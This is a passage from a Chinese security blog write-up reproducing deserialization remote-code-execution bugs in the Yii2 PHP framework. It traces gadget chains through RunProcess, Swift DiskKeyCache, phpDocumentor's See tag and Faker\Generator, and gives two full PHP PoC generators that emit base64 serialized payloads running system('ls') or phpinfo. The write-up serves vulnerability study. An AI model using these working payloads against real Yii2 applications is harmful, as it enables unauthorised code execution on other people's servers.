+</code></pre></td></tr></table></div></div><p>成功RCE了</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-005.jpg data-srcset="/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-005.jpg, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-005.jpg 1.5x, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-005.jpg 2x" data-sizes=auto alt=/yii2框架-反序列化漏洞复现/yii2-005.jpg title=/yii2框架-反序列化漏洞复现/yii2-005.jpg></p><h3 id=2308版本反序列化>2.3.08版本反序列化</h3><p>利用链的起点\yii\vendor\codeception\codeception\ext\RunProcess.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>    public function __destruct()
+    {
+        $this-&gt;stopProcess();
+    }
+
+    public function stopProcess()
+    {
+        foreach (array_reverse($this-&gt;processes) as $process) {
+            /** @var $process Process  **/
+            if (!$process-&gt;isRunning()) {
+                continue;
+            }
+            $this-&gt;output-&gt;debug(&#39;[RunProcess] Stopping &#39; . $process-&gt;getCommandLine());
+            $process-&gt;stop();
+        }
+        $this-&gt;processes = [];
+    }
+</code></pre></td></tr></table></div></div><p>同样还是找 <code>__destruct()</code>方法调用了 <code>stopProcess</code>函数，因为这里的 <code>$this->processes</code>可控，也就意味着 <code>process</code>可控，然后下面又调用了 <code>process->isRunning</code>,可以接上第一条利用链的 <code>__call</code>方法开头的后半段。</p><h5 id=利用链1>利用链1</h5><p><code>Codeception\Extension\RunProcess::__destruct()->Faker\Genrator::__call()->yii\rest\IndexAction::run()</code></p><h5 id=poc2>Poc2</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
+<span class=k>namespace</span> <span class=nx>yii\rest</span><span class=p>{</span>
+    <span class=k>class</span> <span class=nc>CreateAction</span><span class=p>{</span>
+        <span class=k>public</span> <span class=nv>$checkAccess</span><span class=p>;</span>
+        <span class=k>public</span> <span class=nv>$id</span><span class=p>;</span>
+
+        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>checkAccess</span> <span class=o>=</span> <span class=s1>&#39;system&#39;</span><span class=p>;</span>
+            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>id</span> <span class=o>=</span> <span class=s1>&#39;ls&#39;</span><span class=p>;</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+
+<span class=k>namespace</span> <span class=nx>Faker</span><span class=p>{</span>
+    <span class=k>use</span> <span class=nx>yii\rest\CreateAction</span><span class=p>;</span>
+
+    <span class=k>class</span> <span class=nc>Generator</span><span class=p>{</span>
+        <span class=k>protected</span> <span class=nv>$formatters</span><span class=p>;</span>
+
+        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+            <span class=c1>// 这里需要改为isRunning
+</span><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>formatters</span><span class=p>[</span><span class=s1>&#39;isRunning&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=p>[</span><span class=k>new</span> <span class=nx>CreateAction</span><span class=p>(),</span> <span class=s1>&#39;run&#39;</span><span class=p>];</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+
+<span class=c1>// poc2
+</span><span class=c1></span><span class=k>namespace</span> <span class=nx>Codeception\Extension</span><span class=p>{</span>
+    <span class=k>use</span> <span class=nx>Faker\Generator</span><span class=p>;</span>
+    <span class=k>class</span> <span class=nc>RunProcess</span><span class=p>{</span>
+        <span class=k>private</span> <span class=nv>$processes</span><span class=p>;</span>
+        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>()</span>
+        <span class=p>{</span>
+            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>processes</span> <span class=o>=</span> <span class=p>[</span><span class=k>new</span> <span class=nx>Generator</span><span class=p>()];</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+<span class=k>namespace</span><span class=p>{</span>
+    <span class=c1>// 生成poc
+</span><span class=c1></span>    <span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>Codeception\Extension\RunProcess</span><span class=p>()));</span>
+<span class=p>}</span>
+<span class=cp>?&gt;</span>
+</code></pre></td></tr></table></div></div><p>运行poc，成功RCE了</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-006.jpg data-srcset="/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-006.jpg, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-006.jpg 1.5x, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-006.jpg 2x" data-sizes=auto alt=/yii2框架-反序列化漏洞复现/yii2-006.jpg title=/yii2框架-反序列化漏洞复现/yii2-006.jpg></p><h5 id=利用链2>利用链2</h5><p><code>\yii\vendor\swiftmailer\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php</code>文件中，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>public function __destruct()
+    {
+        foreach ($this-&gt;keys as $nsKey =&gt; $null) {
+            $this-&gt;clearAll($nsKey);
+        }
+    }
+</code></pre></td></tr></table></div></div><p>跟进 <code>clearAll</code>方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>    public function clearAll($nsKey)
+    {
+        if (array_key_exists($nsKey, $this-&gt;keys)) {
+            foreach ($this-&gt;keys[$nsKey] as $itemKey =&gt; $null) {
+                $this-&gt;clearKey($nsKey, $itemKey);
+            }
+            if (is_dir($this-&gt;path.&#39;/&#39;.$nsKey)) {
+                rmdir($this-&gt;path.&#39;/&#39;.$nsKey);
+            }
+            unset($this-&gt;keys[$nsKey]);
+        }
+    }
+</code></pre></td></tr></table></div></div><p>这里的<code>this->keys</code>以及<code>$nsKey、$itemKey</code>都是我们可控的，所以是可以执行到<code>$this->clearKey</code>的，跟进看看:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>    public function clearKey($nsKey, $itemKey)
+    {
+        if ($this-&gt;hasKey($nsKey, $itemKey)) {
+            $this-&gt;freeHandle($nsKey, $itemKey);
+            unlink($this-&gt;path.&#39;/&#39;.$nsKey.&#39;/&#39;.$itemKey);
+        }
+    }
+</code></pre></td></tr></table></div></div><p>这里的<code>$this->path</code>也可控，可以看到这里是进行了一个字符串拼接操作，那么意味着可以利用魔术方法<code>__toString</code>来触发后续操作。</p><p>全局搜索<code>__toString</code></p><p>文件路径<code>\yii\vendor\phpdocumentor\reflection-docblock\src\DocBlock\Tags\see.php</code></p><p>使用<code>See.php</code>举例</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>public function __toString() : string
+    {
+        return $this-&gt;refers . ($this-&gt;description ? &#39; &#39; . $this-&gt;description-&gt;render() : &#39;&#39;);
+    }
+</code></pre></td></tr></table></div></div><p>可以看到<code>$this->description</code>可控，又可以利用 <code>__call</code></p><p>利用链3</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php>Swift_KeyCache_DiskKeyCache -&gt; phpDocumentor\Reflection\DocBlock\Tags\See::__toString()-&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()
+</code></pre></td></tr></table></div></div><h5 id=poc3>POC3</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=cp>&lt;?php</span>
+<span class=k>namespace</span> <span class=nx>yii\rest</span><span class=p>{</span>
+    <span class=k>class</span> <span class=nc>CreateAction</span><span class=p>{</span>
+        <span class=k>public</span> <span class=nv>$checkAccess</span><span class=p>;</span>
+        <span class=k>public</span> <span class=nv>$id</span><span class=p>;</span>
+
+        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>checkAccess</span> <span class=o>=</span> <span class=s1>&#39;phpinfo&#39;</span><span class=p>;</span>
+            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>id</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span><span class=p>;</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+
+<span class=k>namespace</span> <span class=nx>Faker</span><span class=p>{</span>
+    <span class=k>use</span> <span class=nx>yii\rest\CreateAction</span><span class=p>;</span>
+
+    <span class=k>class</span> <span class=nc>Generator</span><span class=p>{</span>
+        <span class=k>protected</span> <span class=nv>$formatters</span><span class=p>;</span>
+
+        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+            <span class=c1>// 这里需要改为isRunning
+</span><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>formatters</span><span class=p>[</span><span class=s1>&#39;render&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=p>[</span><span class=k>new</span> <span class=nx>CreateAction</span><span class=p>(),</span> <span class=s1>&#39;run&#39;</span><span class=p>];</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+
+<span class=k>namespace</span> <span class=nx>phpDocumentor\Reflection\DocBlock\Tags</span><span class=p>{</span>
+
+    <span class=k>use</span> <span class=nx>Faker\Generator</span><span class=p>;</span>
+
+    <span class=k>class</span> <span class=nc>See</span><span class=p>{</span>
+        <span class=k>protected</span> <span class=nv>$description</span><span class=p>;</span>
+        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>()</span>
+        <span class=p>{</span>
+            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>description</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Generator</span><span class=p>();</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+<span class=p>}</span>
+<span class=k>namespace</span><span class=p>{</span>
+    <span class=k>use</span> <span class=nx>phpDocumentor\Reflection\DocBlock\Tags\See</span><span class=p>;</span>
+    <span class=k>class</span> <span class=nc>Swift_KeyCache_DiskKeyCache</span><span class=p>{</span>
+        <span class=k>private</span> <span class=nv>$keys</span> <span class=o>=</span> <span class=p>[];</span>
+        <span class=k>private</span> <span class=nv>$path</span><span class=p>;</span>
+        <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>()</span>
+        <span class=p>{</span>
+            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>path</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>See</span><span class=p>;</span>
+            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>keys</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
+                <span class=s2>&#34;axin&#34;</span><span class=o>=&gt;</span><span class=k>array</span><span class=p>(</span><span class=s2>&#34;is&#34;</span><span class=o>=&gt;</span><span class=s2>&#34;handsome&#34;</span><span class=p>)</span>
+            <span class=p>);</span>
+        <span class=p>}</span>
+    <span class=p>}</span>
+    <span class=c1>// 生成poc
+</span><span class=c1></span>    <span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>Swift_KeyCache_DiskKeyCache</span><span class=p>()));</span>
+<span class=p>}</span>
+<span class=cp>?&gt;</span>
+</code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-007.jpg data-srcset="/yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-007.jpg, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-007.jpg 1.5x, /yii2%e6%a1%86%e6%9e%b6-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/yii2-007.jpg 2x" data-sizes=auto alt=/yii2框架-反序列化漏洞复现/yii2-007.jpg title=/yii2框架-反序列化漏洞复现/yii2-007.jpg></p><h3 id=小结>小结</h3><ul><li>发现这几个pop链用来用去最后都是靠着<code>__call</code>方法来触发代码执行。</li><li>找链子的开端可以尝试从<code>__destruct</code>入手，然后追链，追方法</li><li><code>__call_user_func</code>中的<code>callback</code>可以是数组</li><li>2.0.38还有2个链子没弄</li><li>2.0.42还有链子&mldr;.</li></ul></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2022-01-19</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://example.com/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ data-title="Yii2框架 反序列化漏洞复现" data-hashtags=yii2框架><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://example.com/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ data-hashtag=yii2框架><i class="fab fa-facebook-square fa-fw"></i></a><a href=javascript:void(0); title="分享到 Hacker News" data-sharer=hackernews data-url=https://example.com/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ data-title="Yii2框架 反序列化漏洞复现"><i class="fab fa-hacker-news fa-fw"></i></a><a href=javascript:void(0); title="分享到 Line" data-sharer=line data-url=https://example.com/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ data-title="Yii2框架 反序列化漏洞复现"><i data-svg-src=/lib/simple-icons/icons/line.min.svg></i></a><a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://example.com/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ data-title="Yii2框架 反序列化漏洞复现"><i class="fab fa-weibo fa-fw"></i></a><a href=javascript:void(0); title="分享到 百度" data-sharer=baidu data-url=https://example.com/yii2%E6%A1%86%E6%9E%B6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ data-title="Yii2框架 反序列化漏洞复现"><i data-svg-src=/lib/simple-icons/icons/baidu.min.svg></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/yii2%E6%A1%86%E6%9E%B6/>yii2框架</a></section><section><span><a href=javascript:void(0); onclick=window.history.back();>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/cve-2018-15664%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ class=prev rel=prev title=CVE-2018-15664漏洞复现><i class="fas fa-angle-left fa-fw"></i>CVE-2018-15664漏洞复现</a></div></div><div id=comments><div id=disqus_thread class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://disqus.com/?ref_noscript>Disqus</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.62.2">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i>LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2021 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>T1p3</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i></a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><script type=text/javascript src=https://t1pe.disqus.com/embed.js defer></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/algoliasearch/algoliasearch-lite.umd.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"","algoliaIndex":"","algoliaSearchKey":"","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-5822DR3BCY',{'anonymize_ip':true});</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=G-5822DR3BCY" async></script></body></html>
